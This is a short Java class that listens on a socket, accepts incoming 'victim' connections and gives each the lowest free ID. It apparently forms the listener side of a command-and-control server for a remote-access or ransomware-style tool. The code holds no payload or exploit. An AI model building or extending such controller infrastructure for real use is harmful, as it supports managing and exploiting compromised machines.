package Modele;

import java.io.IOException;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

import Interfaces.Observable;

public class AttenteConnexionVictim extends Thread{

	
	private ServerStart serveurStart;
	private int Port;
	private InetAddress IP;
	private ServerSocket socketServeur;
	
	public AttenteConnexionVictim(ServerStart s, InetAddress ip, int port) {
		this.serveurStart = s;
		this.IP = ip;
		this.Port = port;
	}
	
	public void run() {
		try {
			socketServeur = new ServerSocket(this.Port, 5, this.IP);
			
			while(true) {
				Socket soc;
				try {
					soc = socketServeur.accept();
					ConnexionVictim c = new ConnexionVictim(soc, this.serveurStart, getNewID());
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
					
				}
				
			}
		} catch (Exception e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
	}

	//Permet de déterminer le nouvel ID de la nouvelle victime en prenant le plus petit id disponible possible
	private int getNewID() {
		int id = 0;
		while(true) {
			if(!contient(this.serveurStart.getlistVictimsConnected(), this.serveurStart.getlistVictimsTransaction(), id)) return id;
			id++;
		}
	}

	private boolean contient(ArrayList<Observable> liste, ArrayList<Observable> listeTransaction,
			int id) {
		for (Observable victim : liste) {
			if(victim.getIdInstance() == id) return true;
		}
		for (Observable victim : listeTransaction) {
			if(victim.getIdInstance() == id) return true;
		}
		return false;
	}
	
}
